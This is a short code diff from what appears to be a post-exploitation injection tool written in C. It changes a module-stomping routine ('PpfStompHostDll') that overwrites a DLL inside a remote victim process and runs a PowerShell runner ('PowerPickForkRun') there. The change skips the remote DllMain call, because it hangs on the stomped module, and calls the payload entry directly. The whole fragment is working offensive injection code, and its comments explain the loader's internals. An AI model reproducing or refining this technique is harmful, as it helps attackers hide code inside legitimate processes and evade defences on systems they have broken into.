@@ -1040,20 +1040,13 @@ static BOOL PpfStompHostDll(
     }
     entry = remoteBase + exportRva;
 
-    /* CRT/DllMain attach (no host work in DllMain). */
-    if (nt->OptionalHeader.AddressOfEntryPoint) {
-        if (!PpfStompRemoteCall4(
-                hProcess,
-                remoteBase + nt->OptionalHeader.AddressOfEntryPoint,
-                remoteBase,
-                1,
-                0,
-                0,
-                15000)) {
-            PpfStompFail("DllMain");
-            return FALSE;
-        }
-    }
+    /*
+     * Skip MinGW CRT DllMainCRTStartup — it hangs on a stomped module
+     * (.tls / LDR still named as the victim). Host DllMain only calls
+     * DisableThreadLibraryCalls; msvcrt/oleaut32 are already initialized
+     * via preload. Call PowerPickForkRun directly.
+     */
+    (void)nt->OptionalHeader.AddressOfEntryPoint;
 
     mapNameLen = MSVCRT$strlen(mapName) + 1;
     remoteMapName = PpfStompRemoteAlloc(hProcess, mapNameLen, PAGE_READWRITE);
